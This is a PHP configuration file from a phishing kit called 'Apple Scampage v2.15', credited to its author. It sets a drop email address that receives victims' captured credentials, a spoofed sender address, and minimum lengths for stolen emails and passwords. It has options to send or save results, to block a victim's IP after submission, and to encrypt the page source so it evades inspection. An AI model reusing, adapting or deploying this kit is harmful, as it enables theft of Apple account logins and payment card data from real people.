<?php

/*
||| L33bo phishers = ICQ: 695059760

Apple Scampage v2.15
by Agung Satrio Kuy
of [B]OCA[H]SHO[P]
NotipBocah
*/

error_reporting(0);

$param = "_"; // Parameter Redirect
$key = "BocahShop";
$elang = 10; // MinLength Email
$plang = 6; // MinLength Pass
$res = "d"; // Mode Result
$devia = "p"; // Device Access
$Your_Email = "result.elite@yandex.com"; // Set your email
$From_Address    = "<creditcard@kiiara.ayden>"; // Address your results will apear to come from
$Send_Log        = 1; // Email results
$Save_Log        = 0; // Saves results to server (./bocah/logs/)
$Abuse_Filter    = 1; // Block absuive text 
$One_Time_Access = 1; // One Time Access: This blocks the users ip after the form has been submitted i.e. prevents users sending multiple fake forms
$EncryptScript   = 1; // Encrypt: This will make html source encrypt maybe slow open
$Encrypt         = 0; // Encrypt: This will send/save your results with aes to decrypt use the key below
$Key             = "512BDAD7D47A2995"; // This key is used to decrypt results and can be changed
$Send_Per_Page   = 1; // Send each pages data seperate
$reloads = 3; // tot reload
$dimulai = "bocahawal"; // tgl mulai
$tglorder = "bocahorder"; // tgl order scam
?>